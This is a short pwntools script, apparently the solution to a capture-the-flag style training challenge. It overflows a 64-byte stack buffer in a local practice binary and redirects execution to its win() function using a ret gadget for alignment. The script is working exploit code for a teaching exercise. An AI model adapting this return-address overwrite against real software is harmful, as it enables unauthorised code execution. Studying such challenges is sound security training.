#!/usr/bin/env python3
"""
Solution for Hands-on Challenge - x64 (64-bit)
"""
from pwn import *

# Set context
context.arch = 'amd64'
context.log_level = 'info'

# Load binary
elf = ELF('../handson/x64/challenge')

# Start process
p = process('../handson/x64/challenge')

# Find offset (buffer[64] + saved RBP = 64 + 8 = 72 bytes for 64-bit)
offset = 64 + 8  # 72 bytes

# Get win function address
win_addr = elf.symbols['win']
log.info(f"win() address: {hex(win_addr)}")

# For 64-bit, we might need a ret gadget for stack alignment
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"ret gadget: {hex(ret_gadget)}")

# Build payload
payload = b'A' * offset
payload += p64(ret_gadget)  # Stack alignment
payload += p64(win_addr)

log.info(f"Payload length: {len(payload)}")

# Send payload
p.sendlineafter(b'input: ', payload)

# Get output
p.interactive()
